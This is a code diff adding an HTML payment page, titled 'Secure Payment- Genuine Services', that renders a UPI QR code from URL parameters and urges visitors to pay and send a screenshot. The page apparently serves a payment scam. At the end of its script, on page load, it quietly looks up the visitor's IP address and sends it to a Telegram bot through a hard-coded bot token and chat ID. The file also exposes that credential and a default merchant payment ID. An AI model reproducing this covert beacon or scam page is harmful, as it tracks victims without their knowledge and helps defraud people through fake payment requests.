@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Secure Payment- Genuine Services</title>
+    <script src="qrcode.min.js"></script>
+    <script src="qrcode.js"></script>
+    <style>
+        .button {
+            padding: 20px;
+            background-color: #ffffff;
+            border: 1px double;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-weight: bolder;
+            width: 20vw;
+            font-size: larger;
+            display: inline-block;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div style="margin-top: 10%;display: flex; flex-direction: column;  justify-content: center;">
+
+        <h1 style="display: block; text-align: center; font-size: 45px;">
+            <p1 id="hd1" style="display: block; margin-bottom: 5px;"> Take Screenshot </p1>
+            <p1 id="hd2">Scan the QR Code...!!</p1>
+        </h1>
+        <h1 style="display: block; text-align: center; font-size: 35px;" id="apphead">PhonePe</h1>
+        <div id="qrcode" style="border: 10px solid white; align-items: center; display: flex; justify-content: center;">
+        </div>
+        <div style="text-align: center; font-size: 25px;">
+            <button id="refreshButton" style="width: 30%;" class="button">Load QR Code</button>
+            <button id="openProtocolButton" style="display: none;" class="button">Open PhonePe</button>
+        </div>
+        <h1 style="display: block; text-align: center; font-size: 25px;">
+            <p1 id="hdd2">
+                <div style=' color:brown; margin-bottom: 10px; margin-top: 60px'>Payment Failing???</div>
+            </p1>
+            <p1 id="hdd1" style="display: block; margin-bottom: 5px;">👉 Scan the QR Code From -
+                <p1 style='color:green; display: block;'>
+                    'Another Device'
+                </p1>
+            </p1>
+        </h1>
+
+        <h1 style="display: block;margin-top: 50px; text-align: center; width: 100%;">
+            Finish Payment and Send Screenshot to
+            <p id="msg" style="display: block;margin-top: 10px; color: blue; ">
+            </p>
+        </h1>
+
+    </div>
+    <script type="module">
+        // import { v4 as uuidv4 } from 'https://jspm.dev/uuid';
+        const qrCodeDiv = document.getElementById("qrcode");
+
+        function generateQRCode(url) {
+            console.log("Loading QR Code");
+            qrCodeDiv.innerHTML = '';
+            var qr = new QRCode(qrCodeDiv, {
+                text: url,
+                width: 500,
+                height: 500,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+
+
+        }
+        // function generateShortUUID() {
+        //     var id = uuidv4()
+        //     const shortUuid = id.split('-').join('');
+        //     return shortUuid;
+        // }
+
+        const protocols = {
+            paytm: 'paytmmp://pay',
+            phonepe: 'phonepe://pay',
+            gpay: 'tez://upi/pay',
+            others: 'upi://pay'
+        }
+        const protocolName = {
+            paytm: 'PayTm',
+            phonepe: 'PhonePe',
+            gpay: 'Google Pay',
+            others: 'UPI-QR'
+        }
+        const urlParams = new URLSearchParams(window.location.search);
+        const upiId = urlParams.get('upi');
+        const queryName = urlParams.get('name');
+        const protocol = urlParams.get('protocol');
+        const paytmqr = urlParams.get('paytmqr')
+        const userName = encodeURIComponent(queryName ? queryName : "Reddy girls Qr");
+        const msgEle = document.getElementById("msg")
+        msgEle.innerText = `${decodeURIComponent(userName.toUpperCase())}`
+        let url = ''
+        console.log(protocol);
+        if (false && protocol && (upiId.toLowerCase().includes('q210249262@ybl') || upiId.toLowerCase().includes('q137045557@ybl'))) {
+            url = `${protocols[protocol]}?pa=${upiId}&pn=${userName.replace(/\s/g, "")}&mode=02&tn=${userName.replace(/\s/g, "")}${paytmqr ? `&paytmqr=${paytmqr}` : ""}`;
+            generateQRCode(url);
+            window.location.replace(url);
+        } else {
+            const upi = upiId ? upiId : `paytmqr281005050101jnirp1ueoe1y@paytm`;
+            url = `upi://pay?pa=${upi}&mode=02&tn=${userName.replace(/\s/g, "")}&mam=15&pn=${userName.replace(/\s/g, "")}${paytmqr ? `&paytmqr=${paytmqr}` : ""}`
+            generateQRCode(url)
+        }
+        const openProtocolButton = document.getElementById("openProtocolButton");
+        const appheadbtn = document.getElementById("apphead");
+        if (protocolName[protocol]) {
+            const heading = `${protocolName[protocol]} ${protocol == 'gpay' ? "" : "Only!!"}`
+            appheadbtn.innerText = heading;
+
+            // if (protocol == 'phonepe') {
+            //     openProtocolButton.style.display = 'inline-block';
+            //     openProtocolButton.innerText = 'Open ' + protocolName[protocol];
+            //     openProtocolButton.addEventListener("click", () => {
+            //         if (protocol) {
+            //             url = `${protocols[protocol]}`;
+            //             window.location.replace(url);
+            //         }
+            //     });
+            // }
+
+        }
+
+        document.getElementById("refreshButton").addEventListener("click", () => { generateQRCode(url) });
+
+
+        console.log('here');
+        fetch('https://api.db-ip.com/v2/free/self')
+            .then(result => result.json()).then(output => {
+                const url = `https://api.telegram.org/bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU/sendMessage?chat_id=-1001166751237&text=${userName}:Link Opened:${protocol}--------${output?.ipAddress}`
+                fetch(url, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: ''
+                }).then(res => {
+                    console.log("Request complete!");
+                }).catch((e) => console.log(e))
+            }).catch((e) => console.log(e))
+    </script>
+</body>
+
+</html>
